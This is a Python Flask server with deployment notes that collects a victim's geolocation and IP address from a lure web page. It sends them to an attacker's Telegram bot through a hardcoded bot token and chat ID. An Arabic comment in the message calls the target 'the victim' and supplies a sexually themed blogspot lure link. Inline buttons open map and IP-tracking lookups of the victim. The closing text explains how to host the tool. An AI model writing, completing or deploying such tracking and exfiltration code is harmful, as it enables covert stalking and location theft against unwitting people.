from flask import Flask, request
import requests
import json

app = Flask(__name__)

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/save_location', methods=['POST'])
def save_location():
    location = request.form['location']
    ip = request.form['ip']

    # Set up the Telegram bot API credentials
    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
    telegram_api_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    # Set up the message to send to the Telegram bot
    message = f'Location: {location}\nIP: {ip}\n\nهذا هو الرابط الي هتبعته للضحيه:\nhttps://sexylady2023.blogspot.com'

    # Set up the inline keyboard with buttons
    keyboard = [
        [
            {
                'text': 'فتح الموقع',
                'url': f'https://www.google.com/maps/search/?api=1&query={location}'
            }
        ],
        [
            {
                'text': 'تتبع بصمة الايبي',
                'url': f'https://www.iplocation.net/ip-lookup?addr={ip}'
            }
        ]
    ]

    inline_keyboard = {'inline_keyboard': keyboard}
    reply_markup = json.dumps(inline_keyboard)

    # Send the message to the Telegram bot with the inline keyboard
    post_fields = {
        'chat_id': '373715044',
        'text': message,
        'reply_markup': reply_markup
    }

    response = requests.post(telegram_api_url, data=post_fields)

    # Send a success message
    return 'Location data sent to Telegram bot'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

Note that you'll need to create a new repository on GitHub and upload the `index.html` file to the `/static` folder within the repository. You can then deploy the Python server file to a cloud hosting service (such as Heroku) and set the webhook URL in the Telegram bot's settings to the URL of your hosted server.